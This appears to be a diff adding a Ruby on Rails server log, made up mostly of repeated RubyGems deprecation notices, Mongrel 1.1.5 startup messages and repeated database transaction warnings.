+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is no transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
